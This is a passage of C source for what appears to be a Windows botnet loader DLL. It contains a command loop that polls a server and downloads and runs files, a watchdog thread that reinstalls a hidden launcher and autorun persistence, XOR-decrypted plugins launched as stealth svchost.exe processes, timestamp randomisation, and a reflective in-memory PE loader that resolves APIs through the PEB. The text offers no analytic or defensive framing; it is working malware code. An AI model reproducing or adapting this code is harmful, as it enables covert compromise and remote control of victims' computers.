    {
        if (!XorData(lpFile, dwFile / sizeof(DWORD), DECRYPT_KEY))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!WriteToFile(pwszFilePath, lpFile, dwFile))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        SetRandomFileTime(pwszFilePath);
        SetFileAttributesW(pwszFilePath, FILE_ATTRIBUTE_HIDDEN);
    }

cleanup:
    if (lpFile != NULL) MemoryFree(lpFile);
    if (pwszPluginName != NULL) MemoryFree(pwszPluginName);
    if (pwszProfileDir != NULL) MemoryFree(pwszProfileDir);
    if (pwszFilePath != NULL) MemoryFree(pwszFilePath);

    return;
}


VOID PluginDelete(PWCHAR pwszFile)
{
    HRESULT hr = S_OK;
    PWCHAR pwszPluginName = NULL;
    PWCHAR pwszProfileDir = NULL;
    PWCHAR pwszFilePath = NULL;
    DWORD dwPID = 0;

    if (pwszFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (pwszFile[0] == 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszPluginName = MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszPluginName == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

#if _WIN64
    hr = StringCbPrintfW(pwszPluginName, MemorySize(pwszPluginName), L"%ls64", pwszFile);
#elif _WIN32
    hr = StringCbPrintfW(pwszPluginName, MemorySize(pwszPluginName), L"%ls32", pwszFile);
#endif
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszProfileDir = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszProfileDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"ALLUSERSPROFILE", pwszProfileDir, (MemorySize(pwszProfileDir) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszFilePath = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszFilePath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszFilePath, MemorySize(pwszFilePath), L"%ls\\%ls\\%ls", pwszProfileDir, PLUGIN_DIR, pwszPluginName);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    dwPID = GetStealthProcessPID(L"svchost.exe", pwszPluginName, FALSE);
    if (dwPID != 0)
    {
        if (!KillProcess(dwPID))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
            goto cleanup;
        }

        if (!EraseFile(pwszFilePath))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        }
    }

cleanup:
    if (pwszPluginName != NULL) MemoryFree(pwszPluginName);
    if (pwszProfileDir != NULL) MemoryFree(pwszProfileDir);
    if (pwszFilePath != NULL) MemoryFree(pwszFilePath);

    return;
}


DWORD WINAPI  WatchThread()
{
    HRESULT hr = S_OK;
    PWCHAR pwszProfileDir = NULL;
    PWCHAR pwszLauncherPath = NULL;
    PWCHAR pwszPluginDir = NULL;
    BOOL bSystem = FALSE;

    bSystem = IsProcessSystem(NULL);

    pwszProfileDir = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszProfileDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"ALLUSERSPROFILE", pwszProfileDir, (MemorySize(pwszProfileDir) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszLauncherPath = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszLauncherPath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszLauncherPath, MemorySize(pwszLauncherPath), L"%ls\\%ls", pwszProfileDir, LAUNCHER_NAME);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszPluginDir = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszPluginDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszPluginDir, MemorySize(pwszPluginDir), L"%ls\\%ls", pwszProfileDir, PLUGIN_DIR);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    for (;;)
    {
        if (bStopWatching)
        {
            goto cleanup;
        }

        if (GetFileAttributesW(pwszLauncherPath) == INVALID_FILE_ATTRIBUTES)
        {
            if (WriteToFile(pwszLauncherPath, pbi->lpLauncherBase, pbi->dwLauncherSize))
            {
                SetRandomFileTime(pwszLauncherPath);
                SetFileAttributesW(pwszLauncherPath, FILE_ATTRIBUTE_HIDDEN);
            }
        }

        if (GetFileAttributesW(pwszPluginDir) == INVALID_FILE_ATTRIBUTES)
        {
            if (CreateDirectoryW(pwszPluginDir, NULL))
            {
                SetFileAttributesW(pwszPluginDir, FILE_ATTRIBUTE_HIDDEN);
            }
        }

        if (bSystem)
        {
            if (!IsSystemModeAutorunInstalled())
            {
                InstallSystemModeAutorun(pwszLauncherPath);
            }
        }
        else
        {
            if (!IsUserModeAutorunInstalled())
            {
                InstallUserModeAutorun(pwszLauncherPath);
            }
        }

        Sleep(1000);
    }

cleanup:
    if (pwszProfileDir != NULL) MemoryFree(pwszProfileDir);
    if (pwszLauncherPath != NULL) MemoryFree(pwszLauncherPath);
    if (pwszPluginDir != NULL) MemoryFree(pwszPluginDir);

    return 0;
}


DWORD WINAPI  PluginThread()
{
    WIN32_FIND_DATA fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    HRESULT hr = S_OK;
    LPVOID lpPlugin = NULL;
    PWCHAR pwszProfileDir = NULL;
    PWCHAR pwszFindFile = NULL;
    PWCHAR pwszPluginFile = NULL;
    DWORD dwPlugin = 0;
    BOOL bX64 = FALSE;

    pwszProfileDir = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszProfileDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"ALLUSERSPROFILE", pwszProfileDir, (MemorySize(pwszProfileDir) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszFindFile = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszFindFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszFindFile, MemorySize(pwszFindFile), L"%ls\\%ls\\*", pwszProfileDir, PLUGIN_DIR);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
        goto cleanup;
    }

    hFind = FindFirstFileW(pwszFindFile, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszPluginFile = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszPluginFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
        {
            if (StrCmpNIW(fd.cFileName, L"auto_", (sizeof(L"auto_") - 2) / sizeof(WCHAR)) == 0)
            {
                hr = StringCbPrintfW(pwszPluginFile, MemorySize(pwszPluginFile), L"%ls\\%ls\\%ls", pwszProfileDir, PLUGIN_DIR, fd.cFileName);
                if (FAILED(hr))
                {
                    TELEMETRY(dwID, __VERSION__,  __LINE__, hr, __MODULE__, __FILE__);
                    goto cleanup;
                }

                lpPlugin = ReadFromFile(pwszPluginFile, &dwPlugin);
                if (lpPlugin == NULL)
                {
                    TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
                    goto cleanup;
                }

                if (!XorData(lpPlugin, dwPlugin / sizeof(DWORD), DECRYPT_KEY))
                {
                    TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
                    goto cleanup;
                }

                if (!IsFilePE(lpPlugin, dwPlugin, &bX64))
                {
                    TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
                    goto cleanup;
                }

                if (GetStealthProcessPID(L"svchost.exe", fd.cFileName, FALSE) == 0)
                {
                    if (!LaunchPlugin(fd.cFileName, lpPlugin, dwPlugin))
                    {
                        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
                        goto cleanup;
                    }
                }

                dwPlugin = 0;
                MemoryFree(lpPlugin) ? lpPlugin = NULL : 0;
            }
        }

    } while (FindNextFileW(hFind, &fd) != 0);

cleanup:
    if (lpPlugin != NULL) MemoryFree(lpPlugin);
    if (pwszProfileDir != NULL) MemoryFree(pwszProfileDir);
    if (pwszFindFile != NULL) MemoryFree(pwszFindFile);
    if (pwszPluginFile != NULL) MemoryFree(pwszPluginFile);
    if (hFind != INVALID_HANDLE_VALUE) FindClose(hFind);

    return 0;
}


DWORD WINAPI  WorkThread()
{
    PWCHAR pwszFile = NULL;
    DWORD dwTask = 0;
    DWORD dwCommand = 0;

    pwszFile = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszFile == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    for (;;)
    {
        if (GetMachineParams(&dwNAT, &dwDomain, &dwUptime, &dwLastInput, &dwOS, &dwRights, &dwCapacity, &dwProcNumber, &dwProc, &dwRAM, &dwGPU))
        {
            if (GetTask(dwID, dwNAT, dwDomain, dwUptime, dwLastInput, dwOS, dwRights, dwCapacity, dwProcNumber, dwProc, dwRAM, dwGPU, __VERSION__, __GROUP__, &dwTask, &dwCommand, pwszFile))
            {
                if (dwTask > 0)
                {
                    switch (dwCommand)
                    {
                        case BOT_COMMAND_EXECUTE:
                            DownloadAndExecute(pwszFile);
                            break;

                        case BOT_COMMAND_UPDATE:
                            UpdateBot(dwTask, pwszFile);
                            break;

                        case BOT_COMMAND_UNINSTALL:
                            UninstallBot(dwTask, pwszFile);
                            break;

                        case BOT_COMMAND_PLUGIN_START:
                            PluginStart(pwszFile);
                            break;

                        case BOT_COMMAND_PLUGIN_STOP:
                            PluginStop(pwszFile);
                            break;

                        case BOT_COMMAND_PLUGIN_UPDATE:
                            PluginUpdate(pwszFile);
                            break;

                        case BOT_COMMAND_PLUGIN_DELETE:
                            PluginDelete(pwszFile);
                            break;

                        default:
                            break;
                    }

                    continue;
                }
            }
        }

        Sleep(PING_INTERVAL);
    }

cleanup:
    if (pwszFile != NULL) MemoryFree(pwszFile);

    return 0;
}


VOID StartLoader(LPVOID lpParameters)
{
#if _WIN64
    pbi = (PBOT_INFO64)lpParameters;
#elif _WIN32
    pbi = (PBOT_INFO32)lpParameters;
#endif
    WSADATA wsa;
    HRESULT hr = S_OK;
    PWCHAR pwszProfileDir = NULL;
    PWCHAR pwszLauncherPath = NULL;

    dwID = pbi->dwID;

    if (WSAStartup(0x202, &wsa) != 0)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, WSAGetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszProfileDir = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszProfileDir == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (!GetEnvironmentVariableW(L"ALLUSERSPROFILE", pwszProfileDir, (MemorySize(pwszProfileDir) - 2) / sizeof(WCHAR)))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    pwszLauncherPath = (PWCHAR)MemoryAllocate(NULL, MAX_PATH * sizeof(WCHAR));
    if (pwszLauncherPath == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszLauncherPath, MemorySize(pwszLauncherPath), L"%ls\\%ls", pwszProfileDir, LAUNCHER_NAME);
    if (FAILED(hr))
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    if (StrCmpIW(pwszLauncherPath, pbi->wszLauncherPath) != 0)
    {
        if (!KillProcess(pbi->dwLauncherPID))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        }

        if (!EraseFile(pbi->wszLauncherPath))
        {
            TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        }
    }

    hMutex = CreateMutexW(NULL, FALSE, MUTEX_NAME);
    if (hMutex == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hWatchThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WatchThread, NULL, 0, NULL);
    if (hWatchThread == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    Sleep(1000);

    hPluginThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PluginThread, NULL, 0, NULL);
    if (hPluginThread == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

    hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, NULL, 0, NULL);
    if (hWorkThread == NULL)
    {
        TELEMETRY(dwID, __VERSION__,  __LINE__, GetLastError(), __MODULE__, __FILE__);
        goto cleanup;
    }

cleanup:
    if (pwszProfileDir != NULL) MemoryFree(pwszProfileDir);
    if (pwszLauncherPath != NULL) MemoryFree(pwszLauncherPath);

    return;
}


__declspec(dllexport) __stdcall  DWORD WINAPI RunFromMemory(LPVOID lpParameters)
{
#if _WIN64
    PPEB ppeb = __readgsqword(0x60);
    PBOT_INFO64 pBotInfo = (PBOT_INFO64)lpParameters;
#elif _WIN32
    PPEB ppeb = __readfsdword(0x30);
    PBOT_INFO32 pBotInfo = (PBOT_INFO32)lpParameters;
#endif
    PLDR_DATA_TABLE_ENTRY pldr = NULL;
    PIMAGE_DOS_HEADER pidh = NULL;
    PIMAGE_NT_HEADERS pinh = NULL;
    PIMAGE_EXPORT_DIRECTORY pied = NULL;
    PIMAGE_BASE_RELOCATION pibr = NULL;
    PIMAGE_IMPORT_DESCRIPTOR piid = NULL;
    PIMAGE_IMPORT_BY_NAME pibn = NULL;
    PIMAGE_THUNK_DATA pitd = NULL;
    PIMAGE_THUNK_DATA pitdo = NULL;
    func_LoadLibrary fn_LoadLibrary = NULL;
    func_GetProcAddress fn_GetProcAddress = NULL;
    HMODULE hModule = NULL;
    LPVOID lpKernel32 = NULL;
    LPVOID lpNtDll = NULL;
    LPVOID lpFunction = NULL;
    LPVOID lpDelta = NULL;
    PULONG pulFunction = NULL;
    PULONG pulName = NULL;
    PDWORD pdwPtr = NULL;
    PWORD pwList = NULL;
    PUSHORT pusOrdinal = NULL;
    PUCHAR pucResult = NULL;
    PUCHAR pucName = NULL;
    PUCHAR pucSearch = NULL;
    INT nCnt = 0;
    DWORD dwCount = 0;
    CHAR szLoadLibraryA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    CHAR szGetProcAddress[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};

    if (pBotInfo == NULL)
    {
        goto cleanup;
    }

    pldr = CONTAINING_RECORD(ppeb->Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink);
    pldr = CONTAINING_RECORD(pldr->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink);

    lpNtDll = pldr->DllBase;

    pldr = CONTAINING_RECORD(pldr->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink);

    lpKernel32 = pldr->DllBase;

    pidh = (PIMAGE_DOS_HEADER)lpKernel32;
    pinh = (PIMAGE_NT_HEADERS)((PUCHAR)lpKernel32 + pidh->e_lfanew);
    pied = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)lpKernel32 + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    pulFunction = (PULONG)((PUCHAR)lpKernel32 + pied->AddressOfFunctions);
    pulName = (PULONG)((PUCHAR)lpKernel32 + pied->AddressOfNames);
    pusOrdinal = (PUSHORT)((PUCHAR)lpKernel32 + pied->AddressOfNameOrdinals);

    for (nCnt = 0; nCnt < pied->NumberOfNames; nCnt++)
    {
        pucName = (PUCHAR)lpKernel32 + pulName[nCnt];
        pucSearch = (PUCHAR)&szGetProcAddress;

        while(!(pucResult = *pucSearch - *pucName) && *pucName)
        {
            pucName++;
            pucSearch++;
        }

        if (!pucResult)
        {
            fn_GetProcAddress = (func_GetProcAddress)((PUCHAR)lpKernel32 + pulFunction[pusOrdinal[nCnt]]);
            break;
        }
    }

    for (nCnt = 0; nCnt < pied->NumberOfNames; nCnt++)
    {
        pucName = (PUCHAR)lpKernel32 + pulName[nCnt];
        pucSearch = (PUCHAR)&szLoadLibraryA;

        while(!(pucResult = *pucSearch - *pucName) && *pucName)
        {
            pucName++;
            pucSearch++;
        }

        if (!pucResult)
        {
            fn_LoadLibrary = (func_LoadLibrary)((PUCHAR)lpKernel32 + pulFunction[pusOrdinal[nCnt]]);
            break;
        }
    }

    if (fn_GetProcAddress == NULL || fn_LoadLibrary == NULL)
    {
        goto cleanup;
    }

    pidh=(PIMAGE_DOS_HEADER)pBotInfo->lpLoaderBase;
    pinh = (PIMAGE_NT_HEADERS)((LPBYTE)pBotInfo->lpLoaderBase + pidh->e_lfanew);

    if (pidh->e_magic != 0x5A4D && pinh->Signature != 0x4550)
    {
        goto cleanup;
    }

    pibr = (PIMAGE_BASE_RELOCATION)((LPBYTE)pBotInfo->lpLoaderBase + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    piid = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pBotInfo->lpLoaderBase + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    if (pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
    {
        lpDelta = (LPBYTE)pBotInfo->lpLoaderBase - pinh->OptionalHeader.ImageBase;

        while (pibr->VirtualAddress)
        {
            if(pibr->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
            {
                dwCount = (pibr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                pwList = (PWORD)(pibr + 1);

                for (nCnt = 0; nCnt < dwCount; nCnt++)
                {
                    if (pwList[nCnt])
                    {
                        pdwPtr = (PDWORD)((LPBYTE)pBotInfo->lpLoaderBase + (pibr->VirtualAddress + (pwList[nCnt] & 0xFFF)));
                        *pdwPtr += lpDelta;
                    }
                }
            }

            pibr = (PIMAGE_BASE_RELOCATION)((LPBYTE)pibr + pibr->SizeOfBlock);
        }
    }

    if (pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
    {
        while (piid->Characteristics)
        {
            pitdo = (PIMAGE_THUNK_DATA)((LPBYTE)pBotInfo->lpLoaderBase + piid->OriginalFirstThunk);
            pitd = (PIMAGE_THUNK_DATA)((LPBYTE)pBotInfo->lpLoaderBase + piid->FirstThunk);

            hModule = fn_LoadLibrary((LPCSTR)pBotInfo->lpLoaderBase + piid->Name);
            if (hModule == NULL)
            {
                goto cleanup;
            }

            while (pitdo->u1.AddressOfData)
            {
                if (pitdo->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                {
                    lpFunction = fn_GetProcAddress(hModule, (LPCSTR)(pitdo->u1.Ordinal & 0xFFFF));
                    if (lpFunction == NULL)
                    {
                        goto cleanup;
                    }

                    pitd->u1.Function = lpFunction;
                }
                else
                {
                    pibn = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)pBotInfo->lpLoaderBase + pitdo->u1.AddressOfData);
                    lpFunction = fn_GetProcAddress(hModule, (LPCSTR)pibn->Name);
                    if(lpFunction == NULL)
                    {
                        goto cleanup;
                    }

                    pitd->u1.Function = lpFunction;
                }

                pitdo++;
                pitd++;
            }

            piid++;
        }
    }

    StartLoader(lpParameters);

cleanup:

    return 0;
}


BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hInstance);
            break;

        case DLL_PROCESS_DETACH:
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;
    }

    return TRUE;
}